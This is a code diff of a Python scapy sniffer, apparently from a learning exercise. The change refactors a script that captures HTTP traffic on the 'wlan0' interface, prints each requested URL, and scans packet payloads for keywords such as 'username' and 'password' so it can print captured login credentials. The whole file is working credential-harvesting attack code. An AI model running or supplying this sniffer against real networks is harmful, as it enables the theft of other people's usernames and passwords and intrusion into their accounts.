@@ -7,18 +7,27 @@ def sniff(interface):
     scapy.sniff(iface = interface, store = False, prn = processed_sniffed_packet) 
     #prn = For each packet we capture it'll call another function for us
 
-def processed_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest): #Checks if packet has HTTP layer
+def get_url(packet):
         #print(packet.show()) #Shows which part of the HTTP layer has what 
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-        
+        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
         if packet.haslayer(scapy.Raw): 
-            load = packet[scapy.Raw].load 
-            keyword_list = ["username".encode(), "password".encode(), "pass".encode(), "login".encode(), "user".encode()]
+            load = str(packet[scapy.Raw].load) #Converting byte to str
+            keyword_list = ["username", "password", "pass", "login", "user"]
             for keyword in keyword_list: #Iterating over the list 
                 if keyword in load: #Checking if the value is in the list 
-                    print(load)
-                    break
+                    return load 
+                    #break
+
+def processed_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest): #Checks if packet has HTTP layer
+        url = get_url(packet)
+        print(">> HTTP Request URL " + url.decode()) #str(url)
+        
+        login_info = get_login_info(packet)
+        
+        if login_info:
+                print("\n\n Possible username or password" + login_info + "\n\n")
 
 sniff("wlan0")
